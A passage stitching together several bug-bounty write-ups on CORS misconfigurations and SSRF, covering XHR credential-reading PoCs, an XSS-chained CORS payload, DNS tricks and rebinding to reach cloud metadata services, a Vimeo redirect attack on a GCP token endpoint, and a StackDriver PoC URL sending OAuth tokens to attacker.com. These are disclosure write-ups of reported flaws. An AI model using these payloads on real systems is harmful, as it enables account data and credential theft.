to the web browser. Injecting cookies in web browser. Reason: Because the cookies required for making API request are not present in the web browser. I made CORS exploit PoC and uploaded it to my server as cors.html file. <html> <center> <h2>Exploiting CORS XXX</h2> </center> <div id=\"test\"> <button type=\"button\" onclick=\"cors()\">Exploit</button> </div> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"test\").innerHTML = alert(this.responseText); } }; xhttp.open(\"GET\", \"https://api.vulnerable-domain.com/2.2/account\", true); xhttp.withCredentials = true; xhttp.send(); } </script> </html> As a result, the account’s sensitive information popped up within the origin of my domain which results in the existence of the issue. CORS in different origin. After submitting the report in good explanation they replied this. Reply from program’s developer. The developer said that my report pointed out a serious issue in the framework where they have implemented the same API. 🙂 As of now, the issue is still unresolved and they are sending me a swag T-shirt. I can’t stop myself to further dig into the same program.

This post is covering an SSRF ( Server Side Request Forgery ) bug that was really fun to discover and exploit. It took a lot of work to figure out and to finally exploit. The endpoint was actually sent to me to poke at by another fellow bug hunter, Ibram (after realizing we were on the same program). It was our first time collaborating, and we ended up finding quite a few things of interest. We both dug in and shared findings back and forth on how the application was behaving, which was very helpful. I did also notice this endpoint popped up several times (on about 15 subdomains) from Wayback Machine . The functionality was every bug hunter’s dream for SSRF. It was a proxy endpoint that allows for the client to provide a URL, and the server would make an HTTP request and display the response directly to the user (in HTML). The endpoint was something like https://company.com/proxy. The first thing I tried was to give it my Burp Collaborator instance to see if it would fetch my instance: Press enter or click to view image in full size There was whitelist functionality in use here. It would only fetch hosts from a “trusted” list. I tried different company.com domains and noticed they all worked. So we were able to realize that *.company.com was allowed in this whitelist. The next thing we did was try to find any open redirect or subdomain takeover for *.company.com . This is because we wanted to either use an open redirect to redirect the trusted/allowed domain to something attacker controlled or internal, or use the subdomain takeover to serve my own content from the trusted domain. To start trying to find these, I did some subdomain discovery for *.company.com using Findomain , then looked for live hosts using httprobe , and finally pulled back all the URLs found for those from Wayback Machine using Waybackurls . This gave me a list of a few hundred thousand URLs to search through to find an open redirect or subdomain takeover. I started with open redirects by grepping through the waybackurls output for something that could be an open redirect: grep \"=http\" wayback.txt . This should give output that has a query parameter with the value starting with http , indicating a URL is in that place which is great for discovering open redirects and SSRFs. We ended up finding a few open redirects quite easily! Now, back to the testing with this open redirect to point to my Burp Collaborator instance: Press enter or click to view image in full size Unfortunately, I now found out that any redirect would result in a 302 to a default error page and not follow the redirect. I tried a few different things here, but ultimately learned redirects were not going to work as the server was simply fetching a single URL and returning the response. What I ended up realizing was that any response other than 200 made the application throw a 302 response. I hunted a bit more for subdomain takeovers, but could not find any. My goal was finding an open redirect, but unfortunately that was no longer a viable option. Before diving deeper into the URL parser/whitelist logic, I thought to take a look at the list of subdomains I discovered earlier, and pass that through as the url parameter. The idea was that I could take the domains that didn’t resolve, or those that timed out as they were likely internally accessible, and pass it through and potentially fetch hidden content that the server has access to. I expected this to work for some of the domains, but unfortunately nothing interesting popped up. I also checked *.company.com for any DNS records that pointed to localhost or 127.0.0.1 as I could potentially use this domain for accessing internal resources as the domain is in the list of allowed domains, but points to an internally accessible service. Unfortunately, I could not find any domain that had a DNS record like this. Now, with my options limiting, I decided to try and bypass the URL parser logic to get any URL through the whitelist. I went through just about every special/weird character, different redirect/SSRF bypass technique, and everything available in the publicly available wordlists out there, but had no luck. Any IP address or decimal encoded version would give generic errors. The parser logic seemed quite strong after this round of testing. As a result, bypassing the URL whitelist is probably not going to work, so I then decided to see if this whitelist is overly permissive. I took this list of the top 1000 domains I found on Github and decided to pass that through the url parameter. It turns out it wasn’t as restricted as initially thought! amazonaws.com popped up as an allowed domain. For those not familiar, amazonaws.com is AWS’ domain that is tied to a lot of popular services, such as S3 and EC2, of which customers get their own unique endpoint or subdomain. Finally! I can serve my own content from my AWS resources. To test this out, I hosted an XSS HTML file on S3: Press enter or click to view image in full size As expected, it worked! I now, as a worst case, have XSS that I can report. While XSS can be high impact in certain scenarios, this is one of those features that you just know is more vulnerable so I wanted to keep pushing. I tried a few different things such as trying to get the server to execute my HTML or JavaScript to load in iFrames or images of sensitive content, such as: AWS Metadata Service : <iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe> Local Files: <img src=\"file:///etc/passwd\"> Unfortunately, as indicated by earlier behavior, the server was not actually executing any content on the target URL, but just fetching and returning it. Instead of uploading my content to S3, I decided to launch an EC2 instance so I could serve more dynamic content. I spun-up a quick server and wrote a few simple Flask endpoints to serve various content, perform redirects, and a couple other things. After trying to serve content/files to find more interesting things, I decided to revisit redirects. I thought maybe if I could pass-in a certain response code with the redirect, it would work. I wrote a quick Flask endpoint to accept a url and code query parameter so that I could easily iterate through every HTTP status code. I noticed that the application was caching responses from the same URL, so each URL needed to be different. It was easy enough to get past this by adding in a unique query string on each request, such as: https://my-ec2.amazonaws.com/redirect?1&url=...&code=302 https://my-ec2.amazonaws.com/redirect?2&url=...&code=302 Again, no luck here. At this point, I was getting a bit desperate, so I tried looking for any *.amazonaws.com domain that has a DNS record pointing to localhost , 127.0.0.1 , or the Metadata service 169.254.169.254 . As expected, there was no luck. After many trials and errors, I realized that when I was testing the URL parser logic, the application gave different responses if URLs are not allowed or whether the target URL just didn’t give a 200 response. I found out that the whitelist was not actually *.company.com , but it was in fact *company.com . I didn’t realize this at the time because the requests were failing, but then I remembered that it’s only because the domain doesn’t exist. So here I am, walking home, on my phone buying a domain on AWS neemacompany.com , and setting up DNS records for md.neemacompany.com to point to 169.254.169.254 and local.neemacompany.com to point to 127.0.0.1 . By the time the domain was finally registered and the DNS records propagated, I pulled out my laptop and immediately tried to hit my DNS record pointing to the AWS metadata service and BAM! Press enter or click to view image in full size Successful response from AWS Metadata service Finally! I found the missing piece and as suspected, this functionality was indeed vulnerable. For those not familiar, the AWS Metadata service can be used to get temporary AWS credentials and get access to the company’s AWS environment, depending on what permissions the credentials have. I also tried my local.neemacompany.com and confirmed I could hit the localhost as well (with other internal services). Feeling accomplished, I went ahead to write and submit the report. Now, I can rest in peace for the night! Next morning, I wake up and BAM: Press enter or click to view image in full size Duplicate of a report from nearly a year ago! I laughed as I saw that because of all the work and testing that went into this. I almost suspected the original report didn’t show a high impact due to the fact that it hasn’t been fixed in a year, but I cannot confirm that. It is disappointing to see a good bug getting duped, but honestly in this case I was mostly happy that I was able to figure this bug out (even though I ended up losing $12 with this bug for the domain purchase). It was one of those bugs that would have drove me crazy if I never solved it, so I felt rewarding to go through this whole process as it was very fun to figure out and exploit! It was also great to collaborate with another bug hunter, Ibram , who has been finding some really awesome bugs and interesting leads in this particular target. I hope this post of my thought process of understanding a particular bit of functionality and, finally exploiting it was enjoyable and helpful!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting CORS Misconfiguration using XSS Skip to main content Search This Blog NomanAli181 | BugBaba Discoveries and Writings of security vulnerabilities that I have discovered Exploiting CORS Misconfiguration using XSS Get link Facebook X Pinterest Email Other Apps February 18, 2018 Hello All, This Post is about how i exploited a Cross Origin Resource Sharing (CORS) Misconfiguration with the help of Cross Site Scripting (XSS) After reporting some bugs to Netgear Kudos program I started getting old private program invites on Bugcrowd One of which was with 300+ researchers and running from 2015 I wasn't happy about that, As i thought I won't be able to find any thing as the program is running from such a long time and so many others have looked at it before me. Even if i will get something the chances of that being duplicate is high. But then Osama said this So I finally started looking at it and trying my best to find something, Got one P3 but it went duplicate :( But then I got an endpoint that was having simple CORS misconfiguration and the endpoint was giving user details like email address , age , g ender , DOB , etc in response It was triaged, paid and fix within a week I was happy and was planing to move on to other programs, Sadly none of them were as interesting as this one was. So started looking back at it again, During my initial recon phase i had found a reflected xss on their support portal But that subdomain was out of scope of the program. I don't know why but i just bookmarked it ¯\\_(ツ)_/¯ Latter I found another endpoint that was also giving user details in response, But it was only accepting sub domain's as origin So in this case there are two options : Finding XSS on a Subdomain ( that I already had ) Subdomain Takeover Even after Reading these blogs multiple times, I wasn't able to understand the flow of the attack https://web-in-security.blogspot.in/2017/07/cors-misconfigurations-on-large-scale.html http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html After talking to a lot of people including James Kettle , Daniel Bakker and Kaushal parikh I was finally able to understand how the attack flow will be like 1. The attacker Send the XSS link to user with following Payload <p id=demo></p></script><script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(this.responseText); document.getElementById(\"demo\").innerHTML = this.responseText; } }; xhttp.open(\"GET\", \"https://sub.site.com/api/v2/config\", true); xhttp.withCredentials = true; xhttp.send(); } cors(); </script> 2. This will send a GET request to site.com with origin as sub.site.com and then paste the response back to paragraph tag (in this case) 3. And Send the data to Attacker's Server using JavaScript I quickly reproduce it twice just to be sure and submitted the Report The Bugcrowd Analyst replied this So after sharing few messages,I was able to convince him and it was triaged and paid, The client replied this ^_^ Lessons Learned : Just because the program is old and so many people have looked at it, It doesn't mean there is nothing to find. XSS is lub <3 While i can't share the original poc, But i have tried to re-create the same scenario on my local machine you can get the code from my profile on Github .

Reply Delete Replies Noman Shaikh 19 February 2018 at 00:52 Just doing that is not an issue But, as we can get sensitive data from main domain to a subdomain and we have xss on that subdomain that is we can run JavaScript in the context of that site and using JavaScript we can send the data to any server instead of displaying that.

John Michael Mondilla 2 min read · Mar 2, 2020 -- 2 Listen Share Hello, How are you guys doing? This is my first write-up. Sorry for my noobness. :D Press enter or click to view image in full size Here’s a cute picture of Maple-chan. I want to share an issue that I found on a private bug bounty program. There is an SSRF vulnerability on their PDF generator but the problem on their web app is, you cannot insert special characters. But, I noticed that they have a mobile app and we can insert the payload there. The “save as PDF” function is only available on the web app so we need to insert the payload via mobile app then login to the web app and use the function “save as pdf”. Luckily, payloads that are using forward-slash (/) for spacing are not filtered so we can use an iframe tag payload with a forward slash as the spacing. This is the payload I used: <iframe/src=””> I tried to insert <iframe/src=” http://localhost/ ”> and also <iframe/src=” http://127.0.0.1 ”> but the PDF will be blanked. The next step I did was to create a subdomain and change the DNS into 127.0.0.1. So, the payload should look like this <iframe/src=” http://sub-domain.mydomain.com ”>. I inserted the payload via mobile app and used the function “save as PDF” on their web app. The payload worked but, what I saw on the PDF is the login form of the app. But, I have an idea. What if I am able to access the file which is only available internally. So what I did next is use dirsearch to brute force their directory. I checked the result and found “elmah.axd” which has a status code of 403 in dirsearch means that I am forbidden to access the file. I added “elmah.axd” on my payload and it should look like this. Payload: <iframe/src=” http://sub-domain.mydomain.com/elmah.axd ”> So, I inserted the payload again via mobile app and used the “save as PDF” function on the web app and the payload works. What I saw on the PDF are their error logs. I reported the issue to the company and they rewarded me with a bounty. It only took them an hour to fix the issue and a day to send the bounty. This is short but I hope you enjoy reading this. :) -Michan Bug Bounty -- -- 2 Written by John Michael Mondilla 81 followers · 9 following Memes and Bug Bounties Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Here’s the full content:\n\n[Google VRP] SSRF in Google Cloud Platform StackDriver – Ron Chan Skip to content Ron Chan My Bug Bounty Write Ups Facebook LinkedIn Twitter Instagram Menu Home About Contact [Google VRP] SSRF in Google Cloud Platform StackDriver ronchan Uncategorized December 19, 2019 3 Minutes During the process of testing GAE after reading this awesome blog post , I found a debug application in Google Cloud Platform Stackdriver, user can debug their code by importing the source code to the application. From reading here , user can choose to import the source code from Github, Gitlab or Bitbucket and directly debug the code within the Stackdriver Debug page. Integration with third party applications has proven to be problematic if they are not integrated properly, I found a special class of SSRF in the process of testing this feature. Let’s take a look how they do it in this case. If there is an existing app engine application deployed, you can see there are multiple ways to import source code to this debug application at https://console.cloud.google.com/debug A click on Select Source on Bitbucket will show us a consent page that if you allow google to store oauth token in this application. After authorizing in the oauth screen, user is redirected back to google and presented with user’s bitbucket/gitlab/github’s repo details. By far everything looks secure, redirect_uri cannot be tampered, state parameter is used correctly. But how does Google actually fetch the list of repos and the branch names? Turns out they are doing it in these two requests. List repo from bitbucket/gitlab/github https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/list?pid=groovy-plating-250224 List the branch from bitbucket/gitlab/github https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https%3A%2F%2Fgitlab.com%2Fapi%2Fv4%2Fprojects%2Fprojectid%252Fproject-one%2Frepository%2Ftags From the second request, the url decoded version is https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https://gitlab.com/api/v4/projects/projectid/project-one/repository/tags We can see there is a url parameter in the query part, I replaced https://gitlab.com with https://xxxxxxx.burpcollaborator.net and tried to figure out is there any SSRF protection in place, and surprisingly there was none. More surprisingly, from Burp Collaborator, there was something else in the SSRF request. GET /?per_page=100 HTTP/1.1 Host: evdjffp55g27sbbipe7uqzx1tszin7.burpcollaborator.net Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Bearer 123bcad14289c8a9d3 The request comes with the Authorization header containing the Bitbucket access token. When I think about it, it makes sense to send access token along with the SSRF request since it is requesting personal information from the API endpoints, there is no way Google can do it without the access token of user. Now we have a clear understanding how they are integrating with third party application to import the source code, and also how Google are fetching the resources(branch names, tags etc.) from different API endpoints. This leads us to the last step, trying to exploit this SSRF that send user’s access token to arbitrary url that we specify. The idea is simple, since the request is just a GET request, instead of a POST request, if they are not protecting end user from CSRF for GET requests, then we just send the exploit url to the user and wait for the SSRF from google to send us the access token of the victim. Fortunately, there is no CSRF header in the request, however there are still a few potential headers that could prevent us from exploiting this bug. They have x-pan-versionid, X-Goog-Request-Log-Data and the Referer is https://console.cloud.google.com/ , if they are checking from the backend that these headers must be set and referer domain must match console.cloud.google.com before making the SSRF request, then this would be not exploitable. Luckily there are no such validation in the backend. To conclude, in order to exploit this bug, attacker would need a server listening for HTTPS request, say burp collaborator, and send the crafted url to the victim that has bitbucket/gitlab/github connected to Stackdriver, then attacker would be able to steal victim’s access token from the SSRF request from Google. Final PoC: https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https%3A%2F%2fattacker.com%2Fstealing.json Hope you like reading this post, Google has it fixed now, although the fix is not the perfect fix, I still can’t bypass the validation in place, if you are interested, take a look and report to https://g.co/vulnz if you managed to bypass it!

Here’s the full content:\n\nMy First SSRF Using DNS Rebinding | marek.geleta marek.geleta whoami blog categories whoami blog categories My First SSRF Using DNS Rebinding Written by Marek Geleta with ♥ on 11 November 2019 in Bug Bounty 8 min What is DNS Rebinding? Imagine you are a comuter :D People give you URLs and you load them Of course you won’t load url that points to your internal network… That would be stupid right? Because of this some clever developer wrote code like this to prevent it from happening To make explaining this easier ip_banlist is list of IPs you are blocking domain is the URL you are trying to fetch getHostname is a function that resolves a domain/URL to actual IP address or translates it from eg. octal to IPV4/6 import requests from core_funcs import getHostname from banlists import ip_banlist def secureFetch(domain): if getHostname(domain) not in ip_banlist: r = requests.get(domain) return r.text “You can’t just bypass this” — a not so clever Developer Turns out I actually can! And that’s what DNS Rebinding is about! Let’s go through the function line by line Let’s say the function is ran with domain='http://wtf.geleta.eu' and that the ip_banlist = ['169.254.169.254', '127.0.0.1'] First it runs a DNS query with wtf.geleta.eu which returns 12.34.56.78 which is not in ip_banlist so our journey continues!!! In the meantime the DNS record for wtf.geleta.eu magically changes to 127.0.0.1 🦹🏻‍ now the request is made to http://wtf.geleta.eu so again somewhere in the requests.get() the dns query is ran again and now with DNS record changed to 127.0.0.1 Soooo there’s nothing stopping us from retrieving localhost 🎉🎉🎉 So that’s the theory behind this whole thing. Pretty primitive right? What do we actually need to make this happen Since we can’t manually change the dns record in milliseconds as the program runs, we need a custom DNS server configured to somehow figure out what IP should it resolve to and set TTL to 0 so no caching happens on the backend Some “interface” to configure the domain - what should it resolve to, how many times, stuff like this A fair bit of luck obviously When I found this bug I used https://lock.cmpxchg8b.com/rebinder.html but later on I figured out that it’s not ideal, it only takes 2 IPs and resolves between them randomly so I have to send like 100 requests to get 1 that actually went to localhost :D (This was about 7-8 months ago, I made my own tool for this. So expect little product placement at the end of the post!) How it went down with the actual vulnerability I stumbled upon a service that I can configure to make a json request, set headers, etc. Then it gives me the http response When i set the url to some internal/banned ip like 127.0.0.1 it gave me something like: The request was blocked After few hours of trying to bypass it I was like “This is unbreakable, I’m gonna get some food” Then I got some food and minute after that I remembered that my friend Jan Masarik did one challenge when we were hacking Fireshell CTF 2019 ctf with our CTF team The challenge was about dns rebinding. Writeup: https://ctftime.org/writeup/13005 The actual ctf challenge was created by ELB so If you are reading this I just want to say BIG thank you for making this challenge! So I used the technique from writeup. I set the rebinding to 127.0.0.1/google ip and after sending 100 request with burp intruder 2 of them came back with different lenght than others, I click on one of them and see a html code with title which was name of the company And I was like NO WAY!!!!! IT ACTUALLY FUCKING WORKED WTFFFFFF I’M A 1337 HAXXXXXOR NOW With dns rebinding confirmed, I didn’t actually know what to do… Everything I have ever hacked before were just ctfs - and this is where the challenge usually ends, you have the flag and your are good to go It doesn’t work that well IRL Now all I had was some ssrf that I didn’t know what I can use it for. Few hours went by and there I was sending keybase message to Jan Masarik because I was stuck again. I told him that it was an amazon instance and he sent me some ip adress - 169.254.169.254 I clicked on it and nothing happened, that IP didn’t exist Then he told me that it is the aws metadata IP and if I can retrieve data from there, I basically own their whole aws (It wasn’t completely true as you find out in a while but I was really really excited) I immediately fired up intruder and in few seconds I recieved a response with aws keys Now again I was like I love Pingu btw And I love the ssrfs too! Back Into reality Those were some trashy keys, I couldn’t do almost anything with them… Turns out I can only r/w some buckets but there weren’t any useful, those that were hosted on frontend weren’t writable (my favorite was the one with cookbooks - see screenshot) It made me laugh but I was disappointed. I tried to escalate my privs for another few hours and-or figure out what else could I do but there wasn’t much of it :( Ok so the vuln had some Impact so I could report it. I set severity to P2 Now all left to do was enumerate and possibly get a RCE if I was lucky Fast forward a week I didn’t have any response from the company,no fix, no lawsuit, nothing at all. Perhaps I should report it as P1. But whatever! It was good for me, I could enumerate more. AAAAND After chaining with other ssrf… This was a bit easier - there was a ftp connection vulnerable to ssrf - When some other service than ftp was passed in, let’s say 127.0.0.1:22 server errored out with Bad FTP RESPONSE: SSH-2.0-OpenSSH_someversion So using this I was able to enumerate open internal ports on their server Another thing that was possible was bruteforcing ftp credentials on 127.0.0.1:21 since it was open too, I tried it with top-1k but it didn’t work out :( So I just enumerated the ports… Fast forward another few hours I found a Monit Admin interface I was able to interact with via dns rebinding ssrf It had an buffer overread vuln so I was able to read some memory (+1 point in impact :D) Aaand I could shut down the whole instance using shutdown function in Monit (+10 points) Then I reported this too! I got a response in a fucking month……… Meanwhile I turned into skeleton But eventually they responded! They fixed it, gave me a not that big bounty (It’s a small program), everyone was happy, life went on :D Lessons learned Bugs exist everywhere I you are stuck, go back few steps and start again If you are stuck after doing the step above - message your mentor/more expirienced hacker they will always help you Be patient AF If you have free time, create some great tool! or contribute to other great tools BB is not entirely about money, It’s more about the things you learn Now it’s time for some self-advertisment Are you tired of exploiting DNS Rebinding without gui? This may sound Scriptkiddie-ish but I actually wanted something with gui and logs How it went down I was on a vacation and I got sick probably from the food and I couldn’t go out swimming. So I pulled out my laptop and started working on a Flask api connected to modified dns server via SQL and Redis… And I Can’t forget the React frontend, It was the worst thing of it all. Sorry frontend fanboys, I just value my mental health. After 1.5 days Everything except from the React app of course was done, You can actually check the code out Here and the Live Version with dns server and everything is Here - you can register, create rebind rules, use it to hack something, watch logs and stuff like that. Yes it’s and http link I know that and I hate myself for that but I’m too lazy to spend 2 minutes with certbot For those who didn’t look thamselves what it does is I tell it to make a subdomain that will resolve to 1.2.3.4 3 times and then to 127.0.0.1 1 time It puts the data into db and gives me something like y1982ehiuwqh82319j2139821.gel0.space when I make a query to this domain, dns server looks into db, loads the data into redis for quicker future access and then resolves it based on the rules given If you have a bit of free time, don’t watch netflix - Hack, create and most importantly contribute to https://github.com/makuga01/dnsFookup 😇 I will be veryveryvery happy if someone adds some feature to it or adds something to the frontend, the BE api is nice and working but the frontend is a problem for me Anyway thanks for reading! Hope you liked this writeup, If you have some questions/suggestions/you just wanna talk with some cringy script kiddie just DM me on twitter @marek_geleta or anywhere else I will almost certainly respond to you in few minutes, I like talking to people 😄 I’m sorry for the amount of text/things learned I will get better I promise, I just like writing stories with incorrect grammar PS. sory for my Englandish, It not my primar languge Author: Marek Geleta Words: 1545 Share: Released under CC BY-NC 4.0 Tag: #bugbounty #ssrf #writeup #security #bug #bounty #dns rebinding Back · Home A tale of verbose error message and a JWT token comments powered by Disqus © 2019 - 2020 Marek Geleta"}

TL;DR | by Sayed Abdelhafiz | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Vimeo upload function SSRF Sayed Abdelhafiz 4 min read · Dec 13, 2019 -- 7 Listen Share TL;DR I have found an SSRF vulnerability by exploiting content partial flow which the Vimeo upload function implements in the uploading process. The Journey I was studying the most subject I hate and decided to take a rest, I told myself that I wouldn’t lose anything If I hunted on my lovely target in HackerOne “Vimeo”, I bring my MacBook and I went direct to upload function specifically Google Drive upload feature, I chose to upload from google drive, chose video file, back to BurpSuite to catch the request: Press enter or click to view image in full size Upload Request As you can see, It sends the file URL with google authorization to let the backend server fetch the file from the URL and pass the authorization on the header to access the file from google drive. let’s setup WireShark in our VPS and make the backend request a video file from our server to see what would happen in the backend, that was the result: Press enter or click to view image in full size HTTP Stream Of Download request I noticed unusual headers, like Range , Content-Range . But its name was enough to tell me what it's work. we can assume that most of the time, the size of video files is big, so Vimeo doesn’t request the full file in one request if the size was big. if the video file is small, It will request the full file, if not It will request the file partially until collecting the full file, the following diagram can describe what happens: Press enter or click to view image in full size Normal person uploading The server sends a request to check the file size, then if the file was small as it can be transferred to the server by a single connection, it will request the full file. Suddenly , an idea came to me, what if I didn’t send the full file to the server? For example, if my server responded to the backend server telling it that the file length was 500B , the server will request the 500B , now what if I responded to the server with 200B of data? let’s try it ;) I have coded a Web Server in Python to test it, The full file length is 554231B , when Vimeo requests the full file, my server will respond by 8228B Only! my server will log Vimeo Range the header for me :) Press enter or click to view image in full size My baby script Cool! the server stored the 8228B , requested the rest of the file, Cool! I have a scenario that can lead to SSRF in this case. What If my server responded with a redirect response? vimeo will follow the redirect? store the response? request me the rest? If there rest The following diagram knocked my brain: Press enter or click to view image in full size I love drawing diagrams some web servers restricted me to reproduce the attack, So I decided to code a pure HTTP server to perform this attack, I coded, ran it, and passed my attacker host to the upload function, SURPRISE! my attack works fine! my thoughts were right D: Notice: in Vimeo you can download your original video file, so you can find the request forgery response easily Press enter or click to view image in full size Time to exploit I have gathered information about the server, it was a google cloud Instance, so lets try to retrieve instance metadata, I changed the redirect target to http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token , reproduced the attack and I was able to get their compute engine API access token! it was a great moment for me because it was the first SSRF with the most critical impact I have ever found. Press enter or click to view image in full size Oh What now? Sent to Vimeo, resolved, and paid in 2d! Thanks for reading ;) Timeline Apr 29th: Triaged by HackerOne team. Apr 29th: Vimeo rewarded me initially. May 1st: The vulnerability has been fixed. May 1st: Vimeo rewarded me with the rest of the bounty.

At its core is the FFmpeg program itself, designed for command-line-based processing of video and audio files, and widely used for format transcoding, basic editing (trimming and concatenation), video scaling, video post-production effects, and standards compliance. FFmpeg is known to process HLS playlists that may contain references to external files. Story ! I received a private invitation on bugcrowd , lets call it REDACTED.COM . Basically Redacted.com is a video transcoding platform , so its 99% sure that they’ll be using FFmpeg :P So its obvious the first test i’ll perform on the target will be SSRF only using FFmpeg HLS Processing. Setup ! 1.A small server , just to check logs , you can use AWS or DigitalOcean. 2. B-XSSRF to check the requests. Download it from Here . ( Don’t forget to read the instructions given in repo ) 3. Malicious AVI file. Download it from Here . 4. Open the downloaded AVI file in notepad++ , search for http://127.0.0.1/request.php and replace it with yours. Testing !

In this article, I will be describing two different cases of how I was able to exploit a CORS misconfiguration: The first case based on an XSS, and requires thinking outside of the scope, and the second is based on an advanced CORS exploitation technique. Note: Before You start reading this write-up, you will need to have a basic understanding of what CORS is and how to exploit misconfigurations. Here are some awesome posts to get you caught up: Portswigger’s Post Geekboy’s Pos t Case:#1 Vulnerable Endpoint About a year ago, I was hacking this private program, hosted by HackerOne. After playing with the Origin header in the HTTP request, then inspecting server response to check if they do domains whitelist check or not, I noticed that the application is blindly whitelisting only the subdomains, even non-existing ones. For privacy reasons and the responsible disclosure policy, let’s assume that the web application is hosted in: www.redacted.com This CORS misconfiguration looks something like this: HTTP Request: GET /api/return HTTP/1.1 Host: www.redacted.com Origin: evil.redacted.com Connection: close HTTP Response: HTTP/1.1 200 OK Access-control-allow-credentials: true Access-control-allow-origin: evil.redacted.com This API endpoint was returning the user’s private information, like full name, email address, …. To abuse this misconfiguration so we can perform an attack, like leaking users’ private information, we need either to claim an abandoned subdomain ( Subdomain Takeover), or find an XSS in one of the existing subdomains. Think Outside The Scope Finding an abandoned subdomain is not that trivial, so I decided to go for the second option, finding an XSS in one of the existing subdomains. However, the scope of this private program is limited to only: www.redacted.com, Which means that finding an XSS in other subdomain is definitely out of the scope, but chaining this XSS with the CORS misconfiguration is somehow in the Scope. Right? And, the fact that the other subdomains are out of scope, is the reason that made me more confident, that there is a big chance of finding an XSS on those subdomains since other hackers will not be testing them. So, I start searching for this XSS, with a heart full of hope to find it, And In less than one hour, I found one in banques.redacted.com , using the following payload: https://banques.redacted.com/choice-quiz?form_banque= \"><script>alert(document.domain)</script> &form_cartes=73&iframestat=1 Press enter or click to view image in full size Time to create a nice Proof of Concept, and submit a report Reproduce : So to exploit this CORS Misconfiguration we just need to replace the XSS payload alert(document.domain) , with the following code: function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\"demo\").innerHTML = this.responseText; } }; xhttp.open(\"GET\", \" https://www.redacted.com/api/return \", true); xhttp.withCredentials = true; xhttp.send(); } cors(); Like This : https://banques.redacted.com/choice-quiz?form_banque= \"> <script> function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById(\"demo\").innerHTML=this.responseText}};xhttp.open(\"GET\",\"https://www.redacted.com/api/return\",true);xhttp.withCredentials=true;xhttp.send()}cors(); </script> &form_cartes=73&iframestat=1 And Voilà, we now have a nice PoC: Press enter or click to view image in full size Reward Press enter or click to view image in full size Now, What if I told you that you can still abuse this issue without the need of finding an XSS in any of the existing subdomains, or claiming an abandoned one. That exactly what we will be discussing in the second case. Case:#2 Vulnerable Endpoint This time, I was working on the Ubnt Program, and especially the Application hosted in: https://protect.ubnt.com/ Following the same process, I identified the same CORS Misconfiguration, similar to the previous case, but this time the application fetches the user’s private information from a different location, An API hosted in: https://client.amplifi.com/ api/user/ This Application also blindly whitelist any subdomains, even non-existing ones. Press enter or click to view image in full size And, As we discussed before, to abuse this CORS misconfiguration you will need, either claiming an abandoned subdomain, or finding an XSS in one of the existing subdomains. And since this is a public program, with big scope (All the subdomains are in scope); there is a tiny chance of finding an XSS, not even mentioning a subdomain takeover vulnerability. So, did we reached a dead end? Advanced CORS Technique Well, It turns out, that there is another way, But it requires a certain condition to work. An interesting research done recently by Corben Leo can be found here . Showed that it’s possible to bypass some controls implemented incorrectly using special characters inside the domain name. This research is based on the fact that browsers do not always validate domain names before making requests. Therefore, if some special characters are used, the browser may currently submit requests without previously verifying if the domain name is valid and existent. Example: The fully understand this issue, let’s try to open a URL with special characters like: http://asdf`+=.withgoogle.com. Most browsers will validate the domain names before making any requests. The domain withgoogle.com , is used as a demo, because it’s has a wildcard DNS record Chrome: Press enter or click to view image in full size from https://www.corben.io/advanced-cors-techniques/ Firefox: Press enter or click to view image in full size from https://www.corben.io/advanced-cors-techniques/ Safari: As you can see, Safari is an exception, it will actually send the request and try to load the page, unlike the other browsers. Press enter or click to view image in full size from https://www.corben.io/advanced-cors-techniques/ And we can use all sorts of different characters, even unprintable ones: ,&'\";!$^*()+=`~-_=|{}% // non printable chars %01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f Furthermore, another research done by Davide Danelon can be found here , showed that the other Subset of these special characters can also be used on other browsers. Press enter or click to view image in full size From Davide Danelon research: https://www.bedefended.com/papers/cors-security-guide Now, we know all of this, how can we abuse this issue to perform an Advance CORS Exploitation Technique, for a nice demonstration, let’s go back the vulnerable web application on: https://client.amplifi.com/ The new approach In this case, the web application also accepts the following Origin *.ubnt.com!.evil.com Press enter or click to view image in full size Not just the character “!” , but also the following ones: *.ubnt.com!.evil.com *.ubnt.com\".evil.com *.ubnt.com$.evil.com *.ubnt.com%0b.evil.com *.ubnt.com%60.evil.com *.ubnt.com&.evil.com *.ubnt.com'.evil.com *.ubnt.com(.evil.com *.ubnt.com).evil.com *.ubnt.com*.evil.com *.ubnt.com,.evil.com *.ubnt.com;.evil.com *.ubnt.com=.evil.com *.ubnt.com^.evil.com *.ubnt.com`.evil.com *.ubnt.com{.evil.com *.ubnt.com|.evil.com *.ubnt.com}.evil.com *.ubnt.com~.evil.com And you should know by now that some browsers, such as Safari, accept URL with special characters, like: https://zzzz.ubnt.com=.evil.com . So if we set up a domain: evil.com with a wildcard DNS record, allowing to point all the subdomains (*. evil.com) to www.evil.com , which will be hosting a script in a page like: www.evil.com/cors-poc that will simply send a cross-domain request with the subdomain name as the origin value to the vulnerable endpoint Then somehow we forced an authenticated user to open the link: https://zzzz.ubnt.com=.evil.com /cors-poc Theoretically, we can exfiltrate this user’s private information, as a result. Reproduce : First, set up a Domain with a wildcard DNS record pointing it to your box, in my case, I used GoDaddy to host my domain, with the following configuration: Press enter or click to view image in full size 2. Install NodeJS, create a new directory, and then save inside it the following file: serve.js var http = require('http'); var url = require('url'); var fs = require('fs'); var port = 80 http.createServer(function(req, res) { if (req.url == 